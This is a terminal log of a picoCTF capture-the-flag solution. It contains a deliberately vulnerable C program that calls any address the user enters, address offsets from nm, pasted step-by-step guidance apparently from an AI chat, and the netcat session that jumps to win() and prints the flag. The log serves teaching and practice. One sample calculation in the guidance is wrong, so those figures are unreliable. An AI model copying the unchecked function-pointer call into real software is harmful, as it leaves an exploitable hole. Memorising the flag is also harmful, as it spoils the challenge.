â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/picoCTF]
â””â”€$ cat vuln.c

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}                                                                                                                                                                                                                                           
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/picoCTF]
â””â”€$ nm vuln | grep ' main\| win'

000000000000133d T main
00000000000012a7 T win
                                      
Perfect! Now we have the actual addresses of main and win in the binary without PIE (these are offsets within the binary):

ini
Copy
Edit
main = 0x133d
win  = 0x12a7
ðŸ§® Step-by-Step Calculation
To compute the offset between win and main:

bash
Copy
Edit
offset = win - main = 0x12a7 - 0x133d = -0x96
So the win() function is 0x96 bytes before main.

ðŸ”“ Exploitation Plan Recap
When you connect to the remote service:

nc rescued-float.picoctf.net 62347
Youâ€™ll get something like:

Address of main: 0x5655603d
Now subtract 0x96 from that address:

0x5655603d - 0x96 = 0x56555fa7
Enter that calculated address:

Enter the address to jump to, ex => 0x12345: 0x56555fa7
The win() function will be executed, and the flag will be printed.

ðŸ§® Now calculate the address of win
We already know from your local binary that:

offset = win - main = -0x96
So:
win = 0x5e36cdf3133d - 0x96
    = 0x5e36cdf312a7
    
âœ… Final Step
At the prompt:
Enter the address to jump to, ex => 0x12345:
Type:

0x5e36cdf312a7
Then press Enter, and it will jump to win() and print the contents of flag.txt (i.e., the flag).  

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc rescued-float.picoctf.net 62347        
Address of main: 0x5e36cdf3133d
Enter the address to jump to, ex => 0x12345: 0x5e36cdf312a7
Your input: 5e36cdf312a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_93dd5fcb}
                       
